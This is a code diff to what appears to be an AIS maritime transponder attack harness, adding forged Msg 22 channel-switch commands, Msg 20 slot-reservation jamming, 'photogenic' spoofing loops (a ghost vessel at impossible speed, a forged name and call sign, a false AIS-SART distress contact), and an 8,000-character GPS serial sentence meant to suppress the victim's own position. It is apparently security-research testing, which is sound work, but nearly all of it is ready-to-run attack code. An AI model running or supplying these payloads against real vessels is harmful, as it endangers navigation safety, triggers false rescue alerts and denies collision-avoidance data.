@@ -580,6 +580,98 @@ def build_extras(ctx):
     return ex
 
 
+def _m22_regional(src, vlat, vlon, ch_a, ch_b, power=0):
+    """A spec-valid BROADCAST regional Msg 22 whose region contains the victim, commanding
+    channels ch_a/ch_b. Per IEC 61993-2 17.2/17.7 a unit applies a regional channel setting
+    when it is inside the defined area, so this is the correctly-formatted form the earlier
+    addressed test was missing."""
+    ne_lat = int(round((vlat + 1.0) * 600)); ne_lon = int(round((vlon + 1.0) * 600))
+    sw_lat = int(round((vlat - 1.0) * 600)); sw_lon = int(round((vlon - 1.0) * 600))
+    return enc.encode_type22(src, channel_a=ch_a, channel_b=ch_b, tx_rx=0, power=power,
+                             ne_lon=ne_lon, ne_lat=ne_lat, sw_lon=sw_lon, sw_lat=sw_lat,
+                             addressed=0, zonesize=3)
+
+
+# Channel-management + slot-reservation retry, using spec-valid base-station messages so M22/M20
+# are actually testable (the earlier addressed M22 never met the 61993-2 17.7 acceptance rule).
+ALT_CH_A, ALT_CH_B = 2084, 2085          # regional channels off the default AIS1/AIS2 pair
+DEF_CH_A, DEF_CH_B = 2087, 2088          # AIS1/AIS2
+
+def build_chanmgmt(ctx):
+    V = ctx.victim_mmsi
+    vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    cm = []
+    # establish the base station first (Msg 4), so a unit that checks station class sees a base
+    cm.append(("cm_announce_base",
+        [(enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+          "Msg4 base-station announcement")]))
+    # 1) base commands the region to the ALT channels -> unit should leave AIS1/AIS2
+    cm.append(("cm_m22_base_altchan",
+        [(_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+          f"M22 (base) regional channel switch to {ALT_CH_A}/{ALT_CH_B}")]))
+    # recovery: base restores default channels for the region
+    cm.append(("cm_m22_base_restore",
+        [(_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B),
+          f"M22 (base) restore default channels {DEF_CH_A}/{DEF_CH_B}")]))
+    # 2) SOURCE AUTHORITY: same command from an ordinary ship -> does the unit still obey?
+    cm.append(("cm_m22_ship_altchan",
+        [(_m22_regional(REGULAR_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+          f"M22 (ordinary ship) regional channel switch to {ALT_CH_A}/{ALT_CH_B}")]))
+    cm.append(("cm_m22_ship_restore",
+        [(_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B),
+          "M22 (base) restore default channels after ship test")]))
+    # 3) slot reservation (Msg 20) from base, then ship. We reserve blocks that cover the slots a
+    #    Class A at slow speed typically uses (it transmits ~6 times per 60 s frame, spread evenly).
+    #    A unit that HONORS a base FATDMA reservation must vacate any reserved slot it was using;
+    #    the analyzer computes each victim frame's absolute slot from timing and checks whether the
+    #    victim ever transmits inside a reserved block after the command. This makes M20 a direct
+    #    yes/no test, not a reselection-rate estimate. Default targets bracket the observed slot set
+    #    (~60, 420, 810, 1170, 1525, 1870); if a unit uses different slots, recompute from a
+    #    baseline capture and pass --m20-slots.
+    def m20_blocks(src):
+        return [(enc.encode_type20(src, offset1=off, slots1=15, timeout1=7),
+                 f"M20 reserve slots {off}-{off+14}") for off in M20_TARGET_OFFSETS]
+    cm.append(("cm_m20_base", m20_blocks(BASE_MMSI)))
+    cm.append(("cm_m20_ship", m20_blocks(REGULAR_MMSI)))
+    return cm
+
+M20_TARGET_OFFSETS = [60, 420, 810, 1170, 1525, 1870]   # bracket a slow Class A's typical slots
+
+
+def build_photo(ctx):
+    """Photogenic attacks, each sustained for a couple of minutes so the display can be
+    photographed. RF steps drive the transponder over the air (target contacts); the one serial
+    step drives its GPS input to suppress own position. Each step prints a banner and holds."""
+    V = ctx.victim_mmsi
+    vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    gp = offset_position(vlat, vlon, 45, 4000)     # ghost ~4 km NE of the victim
+    sp = offset_position(vlat, vlon, 90, 3000)
+    steps = []
+    # 1) impossible speed while not moving: fixed position, SOG 102.2 kn (max real value), named.
+    steps.append(("photo_impossible_speed", "rf",
+        [(enc.encode_type1(GHOST_A, gp[0], gp[1], sog=102.2, cog=90.0, nav_status=0),
+          "Type1 ghost, 102.2 kn, position held fixed"),
+         (enc.encode_type24_a(GHOST_A, shipname="GHOST VESSEL"),
+          "Type24 name for the ghost")],
+        "IMPOSSIBLE SPEED: a ghost reporting 102.2 kn while its position never changes"))
+    # 2) forged identity: fabricated name + call sign on a target.
+    steps.append(("photo_forged_identity", "rf",
+        [(enc.encode_type24_a(GHOST_A, shipname="NOT REAL NAME"), "Type24A forged name"),
+         (enc.encode_type24_b(GHOST_A, callsign="FAKE1", shiptype=70), "Type24B forged call sign"),
+         (enc.encode_type1(GHOST_A, gp[0], gp[1], sog=6.0, cog=270.0), "Type1 position for the identity")],
+        "FORGED IDENTITY: a contact with a fabricated name and call sign"))
+    # 3) false distress: 970-prefix (AIS-SART) contact with distress status.
+    steps.append(("photo_sart_distress", "rf",
+        [(enc.encode_type1(SAR_PREFIX, sp[0], sp[1], sog=0.0, nav_status=14),
+          "Type1 AIS-SART (970 prefix), distress status")],
+        "FALSE DISTRESS: an AIS-SART / locating-device contact where no emergency exists"))
+    # 4) traffic denial (serial): own position suppressed by an over-length sentence.
+    steps.append(("photo_dos_noposition", "serial",
+        ("$GPRMC,120000.00,A,4330.0000,N,07130.0000,W,0.0,90.0,180626,,,A," + "9" * 8000 + "\r\n").encode(),
+        "TRAFFIC DENIAL: own position suppressed by an over-length serial sentence"))
+    return steps
+
+
 def build_serial_extras(ctx):
     """Serial-input probes injected on the GPS line; detection is offline from the unit's output
     capture. These exercise the IEC 61162-1 sentence-layer parser. Multi-sentence reassembly on a
@@ -671,6 +763,18 @@ def main():
                     help="run ONLY the extra probes (skip phases 1-3 and the M20 suite)")
     ap.add_argument("--skip-serial-extras", action="store_true",
                     help="with --extras, skip the serial-injected probes (run only RF extras)")
+    ap.add_argument("--chanmgmt", action="store_true",
+                    help="also run the base-station channel-management / slot-reservation retry "
+                         "(spec-valid regional Msg 22 + Msg 20, base then ordinary ship)")
+    ap.add_argument("--chanmgmt-only", action="store_true",
+                    help="run ONLY the channel-management / slot-reservation retry")
+    ap.add_argument("--chanmgmt-gap", type=float, default=45.0,
+                    help="dwell after each channel-management command (long, so a channel "
+                         "switch is unambiguous on the witness)")
+    ap.add_argument("--photo", choices=["impossible_speed", "forged_identity",
+                                        "sart_distress", "dos_noposition"],
+                    help="play ONE photogenic attack in an infinite loop (Ctrl-C to stop) so the "
+                         "display can be photographed; restart with a different value for each shot")
     ap.add_argument("--only", nargs="+", help="run only these named attacks")
     ap.add_argument("--skip", nargs="+", default=[])
     ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
@@ -706,7 +810,8 @@ def main():
 
     ctx = Ctx(args.victim_mmsi, gps)
     timeline = build_timeline(ctx)
-    if args.phase2_only or args.phase3_only or args.extras_only:
+    if (args.phase2_only or args.phase3_only or args.extras_only or args.chanmgmt_only
+            or args.photo):
         timeline = []
     if args.only:
         timeline = [(n, p) for (n, p) in timeline if n in args.only]
@@ -752,6 +857,32 @@ def main():
         rec(event="attack_end", name=name)
 
     try:
+        # ---- photo mode: play ONE attack forever so the display can be photographed ----
+        if args.photo:
+            steps = {n.replace("photo_", ""): (n, kind, payload, banner)
+                     for (n, kind, payload, banner) in build_photo(ctx)}
+            name, kind, payload, banner = steps[args.photo]
+            rec(event="photo_loop_start", name=name, kind=kind)
+            print("\n" + "=" * 66)
+            print(f"  PLAYING (infinite loop): {name}")
+            print(f"  >>> {banner}")
+            print("  >>> Photograph the display now. Press Ctrl-C to stop and restart")
+            print("  >>> with a different --photo value for the next shot.")
+            print("=" * 66 + "\n")
+            reps = 0
+            while True:
+                if kind == "rf":
+                    for bits, meta in payload:
+                        if all(c in "01" for c in bits):
+                            ws.send(bits)
+                    time.sleep(args.accept_cadence)
+                else:
+                    gps.inject_raw(payload)
+                    time.sleep(0.5)
+                reps += 1
+                if reps % 30 == 0:
+                    print(f"    ...still playing '{args.photo}' ({reps} reps), Ctrl-C to stop")
+
         if not (args.m20_only or args.phase2_only or args.phase3_only):
             for i, (name, payloads) in enumerate(timeline):
                 fire(name, payloads, i, len(timeline), tag="P1:")
@@ -817,6 +948,30 @@ def main():
                     rec(event="serial_extra_end", name=name)
                     if i < len(sx) - 1:
                         time.sleep(args.gap)
+
+        # ---- channel-management / slot-reservation retry (--chanmgmt or --chanmgmt-only) ----
+        if args.chanmgmt or args.chanmgmt_only:
+            cm = build_chanmgmt(ctx)
+            print(f"\n=== CHANNEL MANAGEMENT RETRY: {len(cm)} steps, {args.chanmgmt_gap}s dwell each ===")
+            print("    watch the WITNESS: if the victim leaves AIS1/AIS2 after an M22, its frames")
+            print("    vanish from the witness while its SERIAL output continues (alive, moved channel).")
+            rec(event="chanmgmt_start", n=len(cm), base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI,
+                alt_ch=(ALT_CH_A, ALT_CH_B), def_ch=(DEF_CH_A, DEF_CH_B))
+            for i, (name, payloads) in enumerate(cm):
+                # tag command + source so the analyzer can build the base-vs-ship result
+                src = "base" if ("base" in name or name == "cm_announce_base") else "ship"
+                cmd = "M22" if "m22" in name else ("M20" if "m20" in name else "announce")
+                fire(name, payloads, i, len(cm), tag="CM:", extra={"command": cmd, "source": src})
+                if i < len(cm) - 1:
+                    dwell = 8 if name.endswith("restore") or name == "cm_announce_base" else args.chanmgmt_gap
+                    print(f"    ...{dwell:.0f}s dwell (watch witness for the victim on AIS1/AIS2)...")
+                    time.sleep(dwell)
+            # final safety recovery: force the region back to the default channels several times
+            print("    final recovery: restoring default AIS channels for the region")
+            for _ in range(3):
+                ws.send(_m22_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon, DEF_CH_A, DEF_CH_B))
+                rec(event="final_recovery", meta="restore default channels (regional M22)")
+                time.sleep(1)
 
         # ---- phase 2: aggressive tests, larger gaps, severity-ordered ----
         if args.phase2 or args.phase2_only:
